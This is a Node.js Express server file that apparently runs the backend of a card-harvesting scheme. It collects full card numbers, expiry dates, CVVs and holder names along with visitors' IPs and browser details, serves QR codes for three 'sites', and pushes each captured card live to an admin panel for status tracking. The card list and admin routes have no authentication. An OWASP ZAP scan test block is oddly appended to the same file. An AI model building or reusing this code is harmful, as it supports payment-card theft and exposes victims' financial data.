const express = require('express');
const app = express();
const fs = require('fs');
const path = require('path');
const https = require('https');
const http = require('http');
const socketIO = require('socket.io');
const helmet = require('helmet');
const csrf = require('csurf');
const cookieParser = require('cookie-parser');
const rateLimit = require('express-rate-limit');
const winston = require('winston');
const cors = require('cors');
const compression = require('compression');
const { body, validationResult } = require('express-validator');
const sanitizeHtml = require('sanitize-html');
const { upload, checkQRCode, optimizeImage } = require('./qr-handler');
const { addCard, getCards, updateCardStatus, deleteCard } = require('./db');
const ZapClient = require('zaproxy');

// Настройка логирования
const logger = winston.createLogger({
    level: 'info',
    format: winston.format.combine(
        winston.format.timestamp(),
        winston.format.json()
    ),
    transports: [
        new winston.transports.File({ filename: 'error.log', level: 'error' }),
        new winston.transports.File({ filename: 'combined.log' })
    ]
});

// Покращена конфігурація Helmet
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'", "'unsafe-inline'"],
            styleSrc: ["'self'", "'unsafe-inline'"],
            imgSrc: ["'self'", "data:", "https:"],
            connectSrc: ["'self'", "wss:", "https:"],
            upgradeInsecureRequests: []
        }
    },
    hsts: {
        maxAge: 31536000,
        includeSubDomains: true,
        preload: true
    },
    frameguard: { action: 'deny' },
    noSniff: true,
    xssFilter: true
}));

app.use(compression());
app.use(cors({
    origin: 'http://localhost:3000',
    credentials: true
}));
app.use(express.json());
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

// CSRF захист
app.use(csrf({ cookie: true }));
app.use((req, res, next) => {
    res.locals.csrfToken = req.csrfToken();
    next();
});

// Rate limiting
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100,
    message: 'Too many requests from this IP, please try again later.'
});
app.use(limiter);

// Валідація даних карти
const validateCard = [
    body('number').isLength({ min: 16, max: 16 }).isNumeric()
        .withMessage('Card number must be 16 digits'),
    body('exp').matches(/^(0[1-9]|1[0-2])\/([0-9]{2})$/)
        .withMessage('Expiration date must be in MM/YY format'),
    body('cvv').isLength({ min: 3, max: 3 }).isNumeric()
        .withMessage('CVV must be 3 digits'),
    body('holder').trim().escape()
        .isLength({ min: 2, max: 100 })
        .withMessage('Card holder name is required')
];

// Middleware для логування запитів
app.use((req, res, next) => {
    logger.info({
        method: req.method,
        path: req.path,
        ip: req.ip,
        userAgent: req.get('user-agent')
    });
    next();
});

// Роути для QR-кодів з покращеною валідацією
app.get('/qr/:siteNumber', (req, res) => {
    const siteNumber = req.params.siteNumber;
    if (!['1', '2', '3'].includes(siteNumber)) {
        logger.warn(`Invalid site number attempt: ${siteNumber}`);
        return res.status(400).json({ error: 'Invalid site number' });
    }

    if (!checkQRCode(siteNumber)) {
        logger.warn(`QR code not found for site: ${siteNumber}`);
        return res.status(404).json({ error: 'QR code not found' });
    }

    res.sendFile(path.join(__dirname, 'public/qr_codes', `сайт${siteNumber}.png`));
});

// Загрузка нового QR-кода
app.post('/admin/upload-qr', upload.single('qrCode'), async (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).json({ error: 'Файл не был загружен' });
        }

        const siteNumber = req.body.siteNumber;
        if (!['1', '2', '3'].includes(siteNumber)) {
            return res.status(400).json({ error: 'Неверный номер сайта' });
        }

        await optimizeImage(req.file.path);
        
        res.json({ message: 'QR-код успешно загружен' });
    } catch (error) {
        logger.error('Ошибка загрузки QR-кода:', error);
        res.status(500).json({ error: 'Ошибка при загрузке QR-кода' });
    }
});

// API роути з валідацією
app.post('/api/cards', validateCard, async (req, res) => {
    try {
        const errors = validationResult(req);
        if (!errors.isEmpty()) {
            logger.warn('Card validation failed:', errors.array());
            return res.status(400).json({ errors: errors.array() });
        }

        const sanitizedData = {
            ...req.body,
            holder: sanitizeHtml(req.body.holder),
            ip: req.ip,
            ua: req.get('user-agent'),
            referrer: req.get('referrer')
        };

        const cardId = await addCard(sanitizedData);
        res.json({ id: cardId });
    } catch (error) {
        logger.error('Error adding card:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.get('/api/cards', async (req, res) => {
    try {
        const cards = await getCards();
        res.json(cards);
    } catch (error) {
        logger.error('Error getting cards:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.put('/api/cards/:id/status', async (req, res) => {
    try {
        const { id } = req.params;
        const { status } = req.body;
        await updateCardStatus(id, status);
        res.json({ message: 'Status updated' });
    } catch (error) {
        logger.error('Error updating card status:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.delete('/api/cards/:id', async (req, res) => {
    try {
        const { id } = req.params;
        await deleteCard(id);
        res.json({ message: 'Card deleted' });
    } catch (error) {
        logger.error('Error deleting card:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Маршрут для адмін-панелі
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public/admin/index.html'));
});

// Запуск сервера
const PORT = process.env.PORT || 3000;
const server = http.createServer(app);

// Налаштування Socket.IO
const io = socketIO(server, {
    cors: {
        origin: "http://localhost:3000",
        methods: ["GET", "POST"],
        credentials: true
    }
});

// Обробка Socket.IO подій
io.on('connection', (socket) => {
    logger.info('New client connected');
    
    // Відправляємо всі картки при підключенні
    getCards().then(cards => {
        socket.emit('initial_cards', cards);
    });

    // Обробка нових карток
    socket.on('new_card', async (cardData) => {
        try {
            const cardId = await addCard(cardData);
            const cards = await getCards();
            io.emit('cards_update', cards);
        } catch (error) {
            logger.error('Error handling new card:', error);
        }
    });

    // Обробка зміни статусу
    socket.on('update_status', async (data) => {
        try {
            await updateCardStatus(data.id, data.status);
            const cards = await getCards();
            io.emit('cards_update', cards);
        } catch (error) {
            logger.error('Error updating status:', error);
        }
    });

    socket.on('disconnect', () => {
        logger.info('Client disconnected');
    });
});

// Обробка помилок
app.use((err, req, res, next) => {
    if (err.code === 'EBADCSRFTOKEN') {
        logger.warn('Invalid CSRF token', {
            path: req.path,
            ip: req.ip
        });
        return res.status(403).json({
            error: 'Invalid CSRF token'
        });
    }
    
    logger.error('Unhandled error:', err);
    res.status(500).json({
        error: 'Internal server error'
    });
});

// Експортуємо server та app для тестів
module.exports = { server, app };

// Запускаємо сервер тільки якщо файл запущено напряму
if (require.main === module) {
    server.listen(PORT, () => {
        logger.info(`Server is running on port ${PORT}`);
    });
}

describe('Security Scan Tests', () => {
    let zaproxy;

    beforeAll(async () => {
        zaproxy = new ZapClient({
            apiKey: 'your-api-key',
            proxy: 'http://localhost:8080'
        });

        // Запускаємо ZAP
        await zaproxy.core.newSession();
    });

    afterAll(async () => {
        // Зберігаємо звіт
        await zaproxy.core.saveSession();
    });

    it('should scan for XSS vulnerabilities', async () => {
        const target = 'http://localhost:3000';
        
        // Сканування на XSS
        const scanId = await zaproxy.ascan.scan({
            url: target,
            recurse: true,
            inScopeOnly: true,
            scanPolicyName: 'XSS Vulnerabilities'
        });

        // Чекаємо завершення сканування
        await new Promise((resolve) => {
            const interval = setInterval(async () => {
                const status = await zaproxy.ascan.status(scanId);
                if (status === 100) {
                    clearInterval(interval);
                    resolve();
                }
            }, 5000);
        });

        // Отримуємо результати
        const alerts = await zaproxy.core.alerts();
        expect(alerts.filter(alert => alert.risk === 'High')).toHaveLength(0);
    }, 300000);

    it('should scan for SQL injection', async () => {
        const target = 'http://localhost:3000/api/cards';
        
        // Сканування на SQL ін'єкції
        const scanId = await zaproxy.ascan.scan({
            url: target,
            recurse: true,
            inScopeOnly: true,
            scanPolicyName: 'SQL Injection'
        });

        await new Promise((resolve) => {
            const interval = setInterval(async () => {
                const status = await zaproxy.ascan.status(scanId);
                if (status === 100) {
                    clearInterval(interval);
                    resolve();
                }
            }, 5000);
        });

        const alerts = await zaproxy.core.alerts();
        expect(alerts.filter(alert => 
            alert.risk === 'High' && 
            alert.name.includes('SQL Injection')
        )).toHaveLength(0);
    }, 300000);
});